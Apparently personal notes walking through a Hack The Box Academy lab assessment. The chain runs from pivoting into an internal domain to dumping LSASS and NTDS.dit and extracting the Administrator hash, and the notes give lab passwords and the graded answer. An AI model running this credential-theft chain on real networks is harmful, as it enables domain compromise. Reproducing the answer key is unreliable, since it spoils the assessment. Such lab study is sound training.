
## Machines in Scop

##### DMZ
External
```go
10.129.3.90
```

Internal
```go
172.16.119.13
```

-------------

##### Jumphost
JUMP01
```go
172.16.119.7
```

-----------

##### FILE01
```go
172.16.119.10
```

------------

##### DC
```go
172.16.119.11
```


### Question
##### What is the NTLM hash of NEXURA\Administrator?
```go
36e09e1e6ade94d63fbcab5e5b8d6d23
```


Betty Jayde's password
```go
Texas123!@#
```

NMAP Scan
```go
nmap -sV -A -sC -Pn 10.129.3.90
```

jbetty SSH
```go
ssh jbetty@10.129.3.90
```

Host name of the external DMZ machine:
```go
nexura.htb
```

Looking in the `.bash_history` file revealed a users credentials. It also shows him trying to access the file01 server which is on the internal DMZ subnet.

username
```go
hwilliam
```

passwd
```go
dealer-screwed-gym1
```


SSH SOCKS proxy will allow the attacker machine to communicate with the DMZ
```go
ssh -D 9050 jbetty@10.129.4.69
```

NMAP Scan on `FILE01`
```go
proxychains nmap -sN -Pn --min-rate 10 -p 23,25,80,137,138,139,135,445,3389,5985 172.16.119.10
```

NMAP Scan on `DC`
```go
proxychains nmap -sN --min-rate 10 -Pn -p 23,25,80,137,138,139,135,445,3389,5985 172.16.119.11
```

The following ports are in an open/filtered state:

| **Port** | **Service**  |
| -------- | ------------ |
| 23       | Telnet       |
| 25       | smtp         |
| 80       | http         |
| 135      | msrcp        |
| 137      | netbios-ns   |
| 138      | netbios-dgm  |
| 139      | netbios-ssn  |
| 445      | microsoft-ds |
| 3389     | wbt server   |
| 5985     | wsman        |

On `FILE01`....list the SMB shares
```go
proxychains smbmap -H 172.16.119.10 -d nexura.htb -u hwilliam -p dealer-screwed-gym1
```

Here are the shares I have access to:

| Share Name | Access Type |
| ---------- | ----------- |
| HR         | READ/WRITE  |
| Private    | READ/WRITE  |
| Transfer   | READ/WRITE  |
|            |             |

##### Accessing HR Share
```go
proxychains smbclient //172.16.119.10/HR -U nexura.htb/hwilliam%dealer-screwed-gym1  
```

Inside the `Archive` directory there is a password file:
```go
get Employee-Passwords_OLD.psafe3
```

Use pwsafe2john to extract the passwords hash. Reference the [[John The Ripper | JtR]] 
```go
locate *2john*
```

```go
pwsafe2john Employee-Passwords_OLD.psafe3 > backup.txt
```

hash
```go
$pwsafe$*3*801e25992487ae60938723973f543abd7d1fab81f45da156194bc6e1976f8c59*262144*3e1d616a8f82a02514ed88cd37f1b6eab303d9a687c4d48fbe0c866775617978
```

Put hash in a file called backup.hash
```go
echo "$pwsafe$*3*801e25992487ae60938723973f543abd7d1fab81f45da156194bc6e1976f8c59*262144*3e1d616a8f82a02514ed88cd37f1b6eab303d9a687c4d48fbe0c866775617978" > backup.hash
```

Crack file with JtR
```go
john backup.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Cracked Password
```go
michaeljackson
```

Open the file via
```go
pwsafe Employee-Passwords_OLD.psafe3
```
![[Pasted image 20260308192337.png]]

Right clicking each we find usernames and passwords that I store here [[HTB-Academy/11-Password Attacks/Windows Lateral Movement/Skill Assessment/Credentials|Credentials]]  

```go
proxychains xfreerdp /v:172.16.119.7 /u:stom /p:fails-nibble-disturb4 /cert:ignore
```

Didn't work...let's try another users

```go
proxychains xfreerdp /v:172.16.119.7 /u:bdavid /p:caramel-cigars-reply1 /cert:ignore /d:nexura.htb
```

Now attempt to dump LSASS

Trying to dump LSASS remotely
```go
proxychains netexec smb 10.129.234.116 --local-auth -u bdavid -p caramel-cigars-reply1 --lsa
```

In PowerShell
```go
Get-Process lsass
```

PID is 648
```go
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 648 C:\lsass.dmp full
```
File is located at:
```go
C:\Users\bdavid\AppData\Local\Temp\lsass.DMP
```

##### Move the lsass.DMP file to my local machine


>[!Tip] Transferring Data via XfreeRDP
> We can do so by mapping a directory on your attacker machine to a share folder on the remote machine
> - `/drive:LocalShare`: Creates a share called "LocalShare" on the remote machine
> - `/home/dan/Documents/Passwd_Cracking` maps your local folder to "LocalShare"


Create share on localhost
```go
proxychains xfreerdp /v:172.16.119.7 /u:bdavid /p:caramel-cigars-reply1 /cert:ignore /d:nexura.htb /drive:LocalShare,/home/dan/Documents/Passwd_Cracking
```

#### Extract Passwd from LSASS DUMP File

```go
pypykatz lsa minidump lsass.DMP
```

>[!Note] PYPYKATZ LSA Output
> == LogonSession ==
authentication_id 267133 (4137d)
session_id 2
username stom
domainname NEXURA
logon_server DC01
logon_time 2026-03-10T22:10:44.152711+00:00
sid S-1-5-21-1333759777-277832620-2286231135-1106
luid 267133
	== MSV ==
		Username: stom
		Domain: NEXURA
		LM: NA
		NT: 21ea958524cfd9a7791737f8d2f764fa
		SHA1: f2fc2263e4d7cff0fbb19ef485891774f0ad6031
		DPAPI: 06e85cb199e902a0145ff04963e7dd7200000000
	== WDIGEST [4137d]==
		username stom
		domainname NEXURA
		password None
		password (hex)
	== Kerberos ==
		Username: stom
		Domain: NEXURA.HTB
		Password: calves-warp-learning1
		password (hex)630061006c007600650073002d0077006100720070002d006c006500610072006e0069006e0067003100000000000000
		AES128 Key: 21ea958524cfd9a7791737f8d2f764fa
		AES256 Key: 63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
	== WDIGEST [4137d]==
		username stom
		domainname NEXURA
		password None
		password (hex)


This shows an NTLM password hash for the user `stom` (21ea958524cfd9a7791737f8d2f764fa) 

Now I will remote into stom's account via xfreerdp
```go
proxychains xfreerdp /v:172.16.119.7 /u:stom /p:calves-warp-learning1 /cert:ignore /d:nexura /drive:LocalShare,/home/dan/Documents/Passwd_Cracking
```

stom has access to the DC, remote into it.

```go
proxychains evil-winrm -i 172.16.119.11 -u stom -p calves-warp-learning1
```

Creating a shadow copy of C:
```go
*Evil-WinRM* PS C:\Users\stom\Documents> vssadmin CREATE SHADOW /For=C:
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.119.11:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.119.11:5985  ...  OK
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {879fc752-1b10-416c-b3f4-78c0cf6109cc}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

```

```go
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS.dit
```

```go
proxychains xfreerdp /v:172.16.119.11 /u:stom /p:calves-warp-learning1 /cert:ignore /d:nexura /drive:LocalShare,/home/dan/Documents/Passwd_Cracking
```

Copy and save the registry Hives
```go
Evil-WinRM* PS C:\> reg.exe save hklm\sam C:\sam.save
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.119.11:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.119.11:5985  ...  OK
The operation completed successfully.

*Evil-WinRM* PS C:\> reg.exe save hklm\system C:\system.save
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.119.11:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.119.11:5985  ...  OK
The operation completed successfully.

*Evil-WinRM* PS C:\> reg.exe save hklm\security C:\security.save
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.119.11:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.119.11:5985  ...  OK
The operation completed successfully.
```

Now extract the hashes from NTDS.dit
```go
impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
```

Admin's Hash
```go
36e09e1e6ade94d63fbcab5e5b8d6d23
```

